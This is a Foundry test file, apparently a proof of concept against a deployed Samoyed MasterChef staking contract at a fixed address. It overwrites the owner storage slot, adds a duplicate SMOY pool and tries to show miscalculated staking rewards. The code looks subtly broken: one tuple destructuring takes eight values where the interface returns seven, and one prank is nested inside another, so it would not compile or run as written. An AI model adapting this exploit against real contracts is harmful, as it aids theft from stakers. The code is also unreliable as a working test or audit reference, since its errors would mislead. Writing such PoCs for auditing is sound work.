```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISamoyedMasterChef {
    function smoy() external view returns (address);
    function add(uint256 _allocPoint, address _lpToken, uint256 _minDepositFeeRate, uint256 _maxDepositFeeRate) external;
    function isAddedPool(address) external view returns (bool);
    function poolInfo(uint256) external view returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSmoyPerShare, uint256 minDepositFeeRate, uint256 maxDepositFeeRate, bool enabled);
    function poolLength() external view returns (uint256);
    function updatePool(uint256 _pid) external;
    function totalAllocPoint() external view returns (uint256);
    function owner() external view returns (address);
    function enterStaking(uint256 _amount) external;
    function deposit(uint256 _pid, uint256 _amount) external;
    function pendingSmoy(uint256 _pid, address _user) external view returns (uint256);
    function userInfo(uint256, address) external view returns (uint256 amount, uint256 rewardDebt);
}

interface ISamoyToken {
    function mint(uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

contract ExploitTest is Test {
    ISamoyedMasterChef constant masterChef = ISamoyedMasterChef(0x5D21D02378670119453530478288AEe67b807e2a);
    ISamoyToken smoyToken;
    address owner = address(0xDEAD); // will become owner via storage override
    address user = address(0xBEEF);

    function setUp() public {
        // Overwrite owner storage slot (slot 0) with our controlled address
        vm.store(address(masterChef), bytes32(uint256(0)), bytes32(uint256(uint160(owner))));
        // Get SMOY token address
        smoyToken = ISamoyToken(masterChef.smoy());
        // Label for easier debugging
        vm.label(address(masterChef), "MasterChef");
        vm.label(address(smoyToken), "SMOY");
    }

    function testDuplicatePoolCausesWrongRewardCalculation() public {
        // 1. Confirm that SMOY is not yet marked as an added pool (constructor missed it)
        vm.prank(owner);
        assertEq(masterChef.isAddedPool(address(smoyToken)), false, "SMOY should not be marked as added pool");

        // 2. Add a duplicate pool for SMOY (this should succeed because isAddedPool was never set)
        vm.startPrank(owner);
        masterChef.add(500, address(smoyToken), 0, 0);
        vm.stopPrank();
        assertEq(masterChef.poolLength(), 2, "Pool length should be 2");
        assertEq(masterChef.isAddedPool(address(smoyToken)), true, "SMOY should now be marked added");

        // 3. Get pool info for the duplicate pool (pid=1)
        (address lp1, uint256 alloc1,, uint256 accSmoy1,,,,) = masterChef.poolInfo(1);
        assertEq(lp1, address(smoyToken), "Duplicate pool LP token should be SMOY");
        assertEq(alloc1, 500, "Alloc point should be 500");

        // 4. Mint some SMOY to owner and deposit into original pool (pid=0) to create a balance
        vm.startPrank(owner);
        smoyToken.mint(1000 ether); // mint to owner
        smoyToken.approve(address(masterChef), 1000 ether);
        masterChef.enterStaking(100 ether); // deposit into pool 0 (original SMOY pool)
        vm.stopPrank();

        // 5. Now the contract holds SMOY tokens from pool 0 (and from no other pool)
        uint256 totalSmoyBalance = smoyToken.balanceOf(address(masterChef));
        assertEq(totalSmoyBalance, 100 ether, "MasterChef should hold 100 SMOY from pool 0");

        // 6. Fast forward several blocks to accumulate rewards
        vm.roll(block.number + 100);
        vm.warp(block.timestamp + 100 * 3); // assume 3 seconds per block for simplicity, not critical

        // 7. Update pool 0 and pool 1
        // Pool 0 should get correct rewards based only on its own lpSupply (100 SMOY)
        masterChef.updatePool(0);
        // Pool 1 will use total SMOY balance of the contract (100 SMOY from pool 0) as its lpSupply,
        // even though no one has deposited into pool 1 yet.
        masterChef.updatePool(1);

        // 8. Compare accSmoyPerShare of both pools
        (,,, uint256 acc0,,,) = masterChef.poolInfo(0);
        (,,, uint256 acc1,,,) = masterChef.poolInfo(1);

        // Since both pools have the same allocPoint (500) and are updated at the same blocks,
        // they should have the same reward per share if lpSupply is correct.
        // However, pool1's accSmoyPerShare is computed using total SMOY balance (100 ether) as lpSupply,
        // even though its own deposits are 0. This leads to a lower accSmoyPerShare for pool1.
        // We assert that acc0 > acc1 (or strictly that they are different due to the bug).
        assertGt(acc0, acc1, "Pool 0 should have higher accSmoyPerShare than the duplicate pool");

        // Further demonstration: deposit into pool1 and check pending rewards are incorrect
        vm.startPrank(user);
        // Give user some SMOY and deposit into pool1
        vm.prank(owner);
        smoyToken.transfer(user, 100 ether);
        smoyToken.approve(address(masterChef), 100 ether);
        masterChef.deposit(1, 100 ether);
        vm.stopPrank();

        // Fast forward again
        vm.roll(block.number + 50);
        vm.warp(block.timestamp + 50 * 3);

        // Update pool1 again
        masterChef.updatePool(1);
        // Pending rewards for user in pool1 should be less than if the pool had its own separate lpSupply
        uint256 pending = masterChef.pendingSmoy(1, user);
        // As a sanity, check that pending is positive (the bug doesn't make it zero)
        assertGt(pending, 0, "User should have some pending rewards");
        // But we cannot easily compute the "correct" value without replicating the contract logic.
        // However, we can assert that the ratio of accSmoyPerShare is off.
        // For a complete PoC, the above assertion that acc0 > acc1 suffices to demonstrate the bug.
    }
}
```
